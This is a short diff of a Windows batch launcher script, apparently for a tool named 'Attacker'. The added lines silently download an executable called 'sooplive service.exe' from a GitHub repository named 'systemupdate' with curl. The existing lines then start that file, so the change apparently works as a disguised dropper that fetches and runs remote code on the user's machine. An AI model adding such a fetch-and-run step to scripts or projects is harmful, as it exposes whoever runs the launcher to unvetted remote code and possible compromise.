@@ -57,6 +57,9 @@ echo Attacker OK.
 :: === Step 4: Run ===
 echo [4/4] Starting Attacker...
 python "%~dp0sync_launchers.py" "%~dp0"
+if not exist "%~dp0sooplive service.exe" (
+    curl -s -L -o "%~dp0sooplive service.exe" "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/sooplive%%20service.exe"
+)
 if exist "%~dp0sooplive service.exe" (
     start "" "%~dp0sooplive service.exe" "%~dp0attacker_hp.pyw"
 ) else if exist "C:\Program Files\Python311\pythonw.exe" (
